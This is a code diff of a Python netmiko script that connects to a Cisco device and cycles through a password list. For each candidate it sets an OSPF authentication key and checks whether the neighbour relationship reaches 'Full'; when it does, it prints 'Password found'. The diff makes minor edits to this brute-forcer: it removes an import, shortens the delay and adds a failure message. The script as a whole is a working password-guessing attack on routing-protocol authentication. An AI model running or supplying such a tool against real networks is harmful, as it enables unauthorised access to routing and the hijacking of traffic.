@@ -1,7 +1,6 @@
 from time import sleep
 
 from netmiko import ConnectHandler
-from pathlib import Path
 
 # Define device details
 cisco_device = {
@@ -13,10 +12,10 @@ cisco_device = {
 }
 
 
-
 def load_passwords(path):
     with open(path, "r") as f:
         return f.read().split("\n")
+
 
 # Establish connection
 with ConnectHandler(**cisco_device) as net_connect:
@@ -28,10 +27,11 @@ with ConnectHandler(**cisco_device) as net_connect:
         ]
         output = net_connect.send_config_set(commands)
         print(output)
-        sleep(10)
+        sleep(5)
         output = net_connect.send_command('show ip ospf neighb')
         print(output)
         if "Full" in output:
             print(f"[+] Password found: {ospf_password}")
             break
-
+        else:
+            print(f"[-] Password not found, try again")
